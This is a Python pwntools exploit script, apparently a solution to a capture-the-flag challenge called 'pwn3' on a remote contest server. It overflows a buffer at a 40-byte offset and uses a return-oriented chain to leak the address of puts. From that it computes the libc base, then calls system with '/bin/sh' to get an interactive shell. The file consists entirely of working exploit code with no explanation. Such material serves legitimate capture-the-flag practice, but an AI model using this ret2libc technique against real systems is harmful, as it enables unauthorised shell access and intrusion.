from pwn import *

offset = 40

elf = context.binary = ELF("./pwn3")

# p = process()
p = remote("challs.n00bzunit3d.xyz", 42450)

ret = pack(0x000000000040101a)
poprdi = pack(0x0000000000401232)
puts_got = pack(elf.got['puts'])
puts = pack(elf.symbols['puts'])
main = pack(elf.symbols['main'])

payload = b"A" * offset
payload += poprdi + puts_got + puts 
payload += main

p.sendlineafter(b"Would you like a flag?\n", payload)
p.recvline()
puts_leak = u64(p.recvline().strip().ljust(8, b'\x00'))

print(f"PUTS LEAK:{hex(puts_leak)}")

libc = ELF("libc6_2.35-0ubuntu1_amd64.so", checksec=False)

libcBase = puts_leak - libc.symbols['puts']
print(f"LIBC BASE:{hex(libcBase)}")
system = pack(libc.symbols['system'] + libcBase)
binsh = pack(next(libc.search(b'/bin/sh')) + libcBase)

payload = b"A" * offset
payload += ret
payload += poprdi + binsh
payload += system

p.sendline(payload)
p.interactive()